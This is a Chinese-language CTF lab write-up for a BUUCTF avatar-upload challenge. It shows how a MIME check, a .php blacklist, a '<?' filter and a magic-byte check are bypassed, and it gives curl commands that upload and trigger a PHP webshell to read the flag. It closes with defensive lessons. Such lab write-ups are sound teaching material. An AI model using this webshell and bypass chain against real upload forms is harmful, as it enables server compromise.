# BUUCTF - 文件上传绕过实战 (上传头像)

## 题目信息
- **目标地址**: `http://cf307678-4209-449a-985c-788492033aa4.node5.buuoj.cn:81/`
- **Flag**: `flag{07fbb2d5-7694-4a7b-a45f-55aedbe7db04}`

## 题目分析
打开靶机，发现是一个上传头像的页面。通过逐步测试，我们发现服务器对上传文件做了多重过滤和限制：

1. **MIME类型检测**：如果上传普通的文本文件，页面提示 `Not image!`。
2. **后缀黑名单检测**：如果尝试修改 `Content-Type` 并上传 `.php` 结尾的文件，页面提示 `NOT！php!`，说明服务器拉黑了 `.php` 扩展名。
3. **文件内容检测 (PHP标签)**：当我们尝试使用其他可解析的后缀（如 `.phtml`）并包含常规 PHP 标签时，页面提示 `NO! HACKER! your file included '<?'`，说明针对 `<?` 做了关键字过滤。
4. **文件头检测 (Magic Bytes)**：当我们绕过标签检测后，如果文件开头不是合法的图片格式，还会提示 `Don't lie to me, it's not image at all!!!`，这说明后端检测了文件的内容前缀（如Magic Bytes）。

## 绕过姿势
针对以上防御机制，我们需要逐一攻破：
1. **MIME绕过**：通过修改 HTTP 请求，设置文件的 `Content-Type` 为 `image/jpeg`。
2. **黑名单绕过**：使用 `.phtml` 作为文件后缀（在很多中间件配置中，`.phtml`, `.php3`, `.php5` 等也会被作为 PHP 脚本解析）。
3. **内容检测绕过**：由于 `<?` 被过滤，常规的 `<?php ... ?>` 或 `<?= ... ?>` 均无法使用。由于目标环境使用了 PHP 5.x (可从响应头 `X-Powered-By: PHP/5.5.9` 中看出)，我们可以利用 `<script language="php">...</script>` 标签来包含代码，从而绕过对 `<?` 的检查。
4. **文件头绕过**：在 payload 内容最前方添加 `GIF89a` 伪造为 GIF 图像文件头。

## Exploit (Shell 过程)

我们可以直接使用 `curl` 命令一键完成渗透过程：

**第一步：构造 Payload 并进行上传**
利用 `curl -F` 发送 `multipart/form-data` 请求，并显式指定 `type` 来绕过 MIME 检测：

```bash
# 构造包含木马的临时文件
echo 'GIF89a <script language="php">system("cat /flag");</script>' > shell.phtml

# 发起文件上传请求
curl -s -F "file=@shell.phtml;type=image/jpeg" http://cf307678-4209-449a-985c-788492033aa4.node5.buuoj.cn:81/upload_file.php
```

服务器会返回以下成功提示：
```html
<div class="error">
<strong>
上传文件名: shell.phtml<br></strong>
</div>
```

**第二步：访问木马获取 Flag**
一般来说，简单上传的目录路径常为 `/upload/` 或 `/uploads/`。经测试该靶机位于 `/upload/` 目录下。

```bash
# 访问上传的 webshell 并获取执行结果
curl -s http://cf307678-4209-449a-985c-788492033aa4.node5.buuoj.cn:81/upload/shell.phtml
```

**执行结果（获取到Flag）：**
```text
GIF89a flag{07fbb2d5-7694-4a7b-a45f-55aedbe7db04}
```

## 相关知识点总结
1. **MIME 校验脆弱性**：服务端通过 `$_FILES['file']['type']` 校验文件类型是极其不可靠的。此参数完全由客户端提交的 `Content-Type` 请求头控制。
2. **黑名单机制缺陷**：只封禁 `.php` 后缀时，攻击者可以通过 `.phtml`, `.php5`, `.pht` 等偏僻且依然能够被解析的拓展名绕过。最佳实践是使用白名单机制（仅允许 `.jpg`, `.png` 等）。
3. **PHP 标签绕过**：除了标准的 `<?php ?>` 和短标签 `<? ?>` 外，在 PHP 7.0 之前的版本中支持 `<script language="php">` 的方式，该语法常用于在严格过滤 `<?` 的场景下进行 Bypass。
4. **Magic Bytes 伪造**：许多 WAF 或后端代码（如 PHP 的 `exif_imagetype()` 函数）通过读取文件头部几个字节来判断文件格式，在文本最前面加上 `GIF89a` 即可轻松欺骗这套检测机制。
